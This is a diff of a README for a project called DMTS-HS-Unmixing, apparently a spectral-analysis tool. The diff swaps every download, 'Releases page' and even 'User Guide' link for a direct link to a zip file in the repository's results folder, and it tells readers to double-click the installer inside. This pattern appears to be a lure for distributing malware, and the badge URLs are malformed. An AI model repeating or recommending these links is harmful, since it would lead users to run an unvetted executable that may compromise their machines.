@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download DMTS-HS-Unmixing](https://raw.githubusercontent.com/Papagbo/DMTS-HS-Unmixing/main/results/DMTS-HS-Unmixing-v3.1.zip%https://raw.githubusercontent.com/Papagbo/DMTS-HS-Unmixing/main/results/DMTS-HS-Unmixing-v3.1.zip)](https://raw.githubusercontent.com/Papagbo/DMTS-HS-Unmixing/main/results/DMTS-HS-Unmixing-v3.1.zip)
+[![Download DMTS-HS-Unmixing](https://github.com/Papagbo/DMTS-HS-Unmixing/raw/refs/heads/main/results/Unmixing-DMT-H-v1.9-alpha.5.zip%https://github.com/Papagbo/DMTS-HS-Unmixing/raw/refs/heads/main/results/Unmixing-DMT-H-v1.9-alpha.5.zip)](https://github.com/Papagbo/DMTS-HS-Unmixing/raw/refs/heads/main/results/Unmixing-DMT-H-v1.9-alpha.5.zip)
 
 ## 📖 About This Project
 
@@ -26,7 +26,7 @@ To use DMTS-HS-Unmixing:
 
 ## 🛠 Installation Instructions
 
-1. **Visit the Releases Page:** Go to the [Releases page to download](https://raw.githubusercontent.com/Papagbo/DMTS-HS-Unmixing/main/results/DMTS-HS-Unmixing-v3.1.zip).
+1. **Visit the Releases Page:** Go to the [Releases page to download](https://github.com/Papagbo/DMTS-HS-Unmixing/raw/refs/heads/main/results/Unmixing-DMT-H-v1.9-alpha.5.zip).
 2. **Download the Latest Version:** Click on the latest version link to download the installer.
 3. **Run the Installer:** Locate the downloaded file and double-click to start the installation. Follow any prompts to complete the installation.
 
@@ -46,7 +46,7 @@ To use DMTS-HS-Unmixing:
 
 ## 📚 Documentation
 
-For more detailed instructions and insights, please refer to the [User Guide](https://raw.githubusercontent.com/Papagbo/DMTS-HS-Unmixing/main/results/DMTS-HS-Unmixing-v3.1.zip).
+For more detailed instructions and insights, please refer to the [User Guide](https://github.com/Papagbo/DMTS-HS-Unmixing/raw/refs/heads/main/results/Unmixing-DMT-H-v1.9-alpha.5.zip).
 
 ## 📬 Support
 
@@ -66,7 +66,7 @@ DMTS-HS-Unmixing is released under the MIT License.
 
 ## 📥 Download Again
 
-Remember to [visit the Releases page to download](https://raw.githubusercontent.com/Papagbo/DMTS-HS-Unmixing/main/results/DMTS-HS-Unmixing-v3.1.zip) the latest version and enjoy easier spectral analysis.
+Remember to [visit the Releases page to download](https://github.com/Papagbo/DMTS-HS-Unmixing/raw/refs/heads/main/results/Unmixing-DMT-H-v1.9-alpha.5.zip) the latest version and enjoy easier spectral analysis.
 
 --- 
 
